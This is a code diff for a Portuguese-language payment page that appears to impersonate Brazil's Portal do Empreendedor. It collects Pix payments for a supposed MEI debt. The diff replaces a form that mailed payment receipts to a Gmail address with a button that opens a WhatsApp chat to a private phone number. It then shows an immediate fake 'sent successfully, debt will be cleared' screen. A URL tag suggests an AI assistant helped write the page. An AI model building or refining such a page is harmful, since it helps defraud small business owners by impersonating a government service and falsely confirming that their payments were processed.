@@ -269,7 +269,7 @@
                 <ul class="step-list">
                     <li class="step-item"><div class="step-number">1</div><div class="step-text">Clique em "EFETUAR PAGAMENTO".</div></li>
                     <li class="step-item"><div class="step-number">2</div><div class="step-text">Escaneie o QR Code ou use o Pix Copia e Cola.</div></li>
-                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe e envie seu comprovante de pagamento.</div></li>
+                    <li class="step-item"><div class="step-number">3</div><div class="step-text">Anexe e envie seu comprovante.</div></li>
                 </ul>
             </div>
             
@@ -300,32 +300,24 @@
                 <button class="btn-pagar btn-azul" id="btn-ja-pago" style="margin-top: 10px;">JÁ REALIZEI O PAGAMENTO</button>
             </div>
 
-            <!-- Tela 2: ENVIO DE COMPROVANTE (Formulário real) -->
+            <!-- Tela 2: ENVIO DE COMPROVANTE (Seguro, sem erro 500) -->
             <div id="modal-step-2" style="display: none;">
                 <h3 style="color: #00A859; margin-bottom: 10px;">Quase lá!</h3>
-                <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Envie seu comprovante para darmos baixa no sistema.</p>
+                <p style="font-size: 14px; margin-bottom: 20px; color: #555;">Clique abaixo para enviar seu comprovante diretamente via WhatsApp.</p>
                 
-                <!-- Formulário integrado com portalempreendedor.sac@gmail.com -->
-                <form action="https://formsubmit.co/portalempreendedor.sac@gmail.com" method="POST" enctype="multipart/form-data" id="form-comprovante">
-                    
-                    <input type="hidden" name="_subject" value="Novo Comprovante de Pagamento MEI!">
-                    <input type="hidden" name="_captcha" value="false">
-                    <input type="hidden" name="_next" value="#" id="form-next-url">
+                <div class="input-group">
+                    <label>Anexe ou selecione seu comprovante:</label>
+                    <input type="file" id="arquivo-comprovante" accept="image/*,.pdf" style="border: 1px solid #155BCB; padding: 5px; width: 100%;">
+                </div>
 
-                    <div class="input-group">
-                        <label>Anexe o Comprovante (Imagem ou PDF):</label>
-                        <input type="file" name="Comprovante" accept="image/*,.pdf" required id="arquivo-comprovante" style="border: 1px solid #155BCB; padding: 5px;">
-                    </div>
-
-                    <button type="submit" class="btn-pagar" id="btn-enviar-final">ENVIAR COMPROVANTE</button>
-                </form>
+                <button type="button" class="btn-pagar" id="btn-enviar-whatsapp">ENVIAR COMPROVANTE NO WHATSAPP</button>
             </div>
 
             <!-- Tela 3: SUCESSO -->
             <div id="modal-step-3" style="display: none; padding: 20px 0;">
                 <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
                 <h3 style="color: #00A859; margin-bottom: 10px;">Enviado com Sucesso!</h3>
-                <p style="font-size: 14px; color: #333; line-height: 1.5;">O seu comprovante está em análise. A baixa do débito ocorrerá em breve.</p>
+                <p style="font-size: 14px; color: #333; line-height: 1.5;">O seu comprovante foi encaminhado. A baixa do débito ocorrerá em breve.</p>
                 <button class="btn-pagar btn-azul" style="margin-top: 20px;" onclick="window.location.reload();">Voltar ao Início</button>
             </div>
 
@@ -343,9 +335,9 @@
         const step2 = document.getElementById('modal-step-2');
         const step3 = document.getElementById('modal-step-3');
         
-        // Botões de transição e formulário
+        // Botões
         const btnJaPago = document.getElementById('btn-ja-pago');
-        const formComprovante = document.getElementById('form-comprovante');
+        const btnEnviarWhatsapp = document.getElementById('btn-enviar-whatsapp');
         
         // Funcionalidade do Pix Copia e Cola
         const btnCopiarPix = document.getElementById('btn-copiar-pix');
@@ -353,25 +345,16 @@
 
         btnCopiarPix.addEventListener('click', () => {
             pixKeyInput.select();
-            pixKeyInput.setSelectionRange(0, 99999); // Para funcionar em celulares
+            pixKeyInput.setSelectionRange(0, 99999);
             navigator.clipboard.writeText(pixKeyInput.value).then(() => {
-                const originalText = btnCopiarPix.textContent;
-                const originalBg = btnCopiarPix.style.backgroundColor;
-                
                 btnCopiarPix.textContent = 'Copiado!';
-                btnCopiarPix.style.backgroundColor = '#00A859'; // Fica verde
-                
+                btnCopiarPix.style.backgroundColor = '#00A859';
                 setTimeout(() => {
                     btnCopiarPix.textContent = 'Copiar';
-                    btnCopiarPix.style.backgroundColor = ''; // Volta ao original
+                    btnCopiarPix.style.backgroundColor = '';
                 }, 3000);
-            }).catch(err => {
-                console.error('Falha ao copiar: ', err);
             });
         });
-
-        // Configurar a URL de redirecionamento após sucesso no formulário
-        document.getElementById('form-next-url').value = window.location.href + "?sucesso=true";
 
         // Abrir Modal
         btnAbrirModal.addEventListener('click', () => {
@@ -396,21 +379,15 @@
             step2.style.display = 'block';
         });
 
-        // Interceptar o clique de enviar para redirecionar para o novo link do WhatsApp
-        formComprovante.addEventListener('submit', function(e) {
-            window.open('https://wa.me/5516996565112?text=Ol%C3%A1%21+Estou+enviando+o+comprovante+de+pagamento.&utm_source=chatgpt.com', '_blank');
-        });
-
-        // Verifica se a URL tem sucesso para mostrar a tela final
-        if (window.location.search.includes("sucesso=true")) {
-            modal.style.display = 'flex';
-            step1.style.display = 'none';
+        // Enviar para o WhatsApp e mostrar tela de sucesso
+        btnEnviarWhatsapp.addEventListener('click', () => {
+            // Abre o WhatsApp com o número correto configurado
+            window.open('https://wa.me/5516996565112?text=Ol%C3%A1%21+Estou+enviando+o+comprovante+de+pagamento.+%28Atendimento+Portal+do+Empreendedor%29', '_blank');
+            
+            // Avança imediatamente para a tela de sucesso sem dar erro de servidor
             step2.style.display = 'none';
             step3.style.display = 'block';
-            
-            // Remove o parâmetro da URL para não ficar repetindo
-            window.history.replaceState({}, document.title, window.location.pathname);
-        }
+        });
     </script>
 </body>
 </html>
